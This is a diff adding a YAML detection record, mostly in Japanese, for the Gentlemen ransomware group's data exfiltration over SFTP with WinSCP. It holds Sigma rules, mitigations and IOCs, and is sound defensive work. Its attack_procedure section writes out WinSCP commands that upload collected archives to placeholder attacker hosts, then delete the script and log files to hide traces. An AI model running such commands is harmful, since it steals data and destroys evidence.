@@ -1,0 +1,132 @@
+id: ADS-010
+title: "Exfiltration Over Alternative Protocol - WinSCP/SFTP Data Exfiltration"
+actor: "The Gentlemen"
+aliases:
+  - "Gentleman"
+  - "Gentlemen RaaS"
+  - "Hastalamuerte"
+created: "2026-06-25"
+mitre_technique:
+  id: "T1048.001"
+  name: "Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
+  url: "https://attack.mitre.org/techniques/T1048/001"
+platform:
+  - "Windows"
+phase: "Exfiltration"
+
+description: |
+  The Gentlemen は WinSCP を使用して収集したデータを SFTP/SCP 経由で攻撃者管理インフラへ持ち出す。
+  暗号化された転送は正規のトラフィックに溶け込むため検知が困難。
+  ダブルエクストーション戦略の一環として、暗号化前にデータを搾取する。
+
+attack_procedure: |
+  # ステップ 1: WinSCP バイナリをターゲットシステムにドロップ
+  # (例: C:\Temp\WinSCP.exe または C:\ProgramData\WinSCP.exe)
+
+  # ステップ 2: WinSCP スクリプトモードでデータを転送
+  # WinSCP スクリプトファイルの作成
+  cat > C:\Temp\upload.txt << EOF
+  open sftp://<attacker_user>:<password>@<attacker_sftp_server>/
+  put C:\Temp\exfil\ /upload/
+  exit
+  EOF
+
+  # WinSCP スクリプト実行
+  WinSCP.exe /script=C:\Temp\upload.txt /log=C:\Temp\winscp.log
+
+  # ステップ 3: コマンドラインでの直接転送
+  WinSCP.exe sftp://<user>:<pass>@<attacker_ip>/ /command "put C:\Temp\data.7z /upload/" "exit"
+
+  # ステップ 4: アーカイブ転送 (7-Zip 圧縮後)
+  # (ADS-009 で収集・圧縮されたデータを転送)
+  WinSCP.exe sftp://<user>@<attacker_ip>/ /command "put C:\Temp\data.7z /data/" "exit"
+
+  # ステップ 5: 転送後にログ・スクリプトファイルを削除
+  del C:\Temp\upload.txt
+  del C:\Temp\winscp.log
+
+tools_used:
+  - name: "WinSCP"
+    description: "正規の SFTP/SCP クライアント (LOLBin として悪用)"
+  - name: "7-Zip"
+    description: "データ圧縮 (持ち出し前の圧縮)"
+
+detection:
+  log_sources:
+    - "Sysmon"
+    - "Windows Firewall Logs"
+    - "ネットワークフロー (NetFlow / IPFIX)"
+    - "プロキシ・DLP"
+    - "EDR テレメトリ"
+  expected_events:
+    - "Sysmon EventID 1: WinSCP.exe の実行 (特に /script または /command オプション付き)"
+    - "Sysmon EventID 3: WinSCP.exe から外部 IP への 22/TCP (SFTP) 接続"
+    - "ネットワーク: 22/TCP での大容量データ送信 (通常の SSH 管理トラフィックを超える)"
+    - "ファイアウォール: 未承認の外部 SFTP 接続"
+    - "Sysmon EventID 11: winscp.log、upload.txt などのスクリプトファイル作成"
+  detection_rule: |
+    title: WinSCP Used for Data Exfiltration - Script Mode Execution
+    id: a1b2c3d4-0010-0010-0010-000000000010
+    status: experimental
+    description: Detects WinSCP execution in script mode commonly used for automated data exfiltration
+    logsource:
+      product: windows
+      category: process_creation
+    detection:
+      selection:
+        Image|endswith: '\WinSCP.exe'
+        CommandLine|contains:
+          - '/script='
+          - '/command'
+          - 'sftp://'
+          - 'scp://'
+      condition: selection
+    falsepositives:
+      - Legitimate automated SFTP transfers in IT operations
+    level: high
+    tags:
+      - attack.exfiltration
+      - attack.t1048.001
+
+  additional_detection: |
+    title: Large Data Transfer Over SFTP from Internal Host
+    description: Detects unusually large data transfers over SSH/SFTP from internal hosts to external IPs
+    logsource:
+      product: network
+      service: firewall
+    detection:
+      selection:
+        dst_port: 22
+        bytes_sent|gte: 104857600  # 100MB threshold
+        direction: outbound
+      condition: selection
+    falsepositives:
+      - Legitimate large file transfers to approved SFTP servers
+    level: medium
+
+  mitigations:
+    - "承認された送信先のみへの 22/TCP (SFTP) 接続を許可するファイアウォールルール"
+    - "DLP で 22/TCP の大容量送信を検知"
+    - "WinSCP の使用を承認された管理ホストに限定"
+    - "SFTP 接続先を既知のビジネス用途のホストに制限"
+    - "未承認の外部 SFTP 接続を IDS/IPS でブロック"
+    - "エンドポイントでの WinSCP 実行 (/script モード) を EDR で監視"
+
+ioc:
+  hashes: []
+  file_names:
+    - "WinSCP.exe"
+    - "upload.txt"
+    - "winscp.log"
+    - "data.7z"
+  notes: |
+    The Gentlemen は攻撃者管理の SFTP サーバーにデータを持ち出す。
+    転送後にスクリプトファイルとログを削除し証跡を消去する。
+
+references:
+  - source: "Group-IB"
+    url: "https://www.group-ib.com/blog/hastalamuerte-gentlemen-raas-ttps/"
+  - source: "Trend Micro"
+    url: "https://www.trendmicro.com/en_us/research/25/i/unmasking-the-gentlemen-ransomware.html"
+  - source: "MITRE ATT&CK T1048.001"
+    url: "https://attack.mitre.org/techniques/T1048/001"
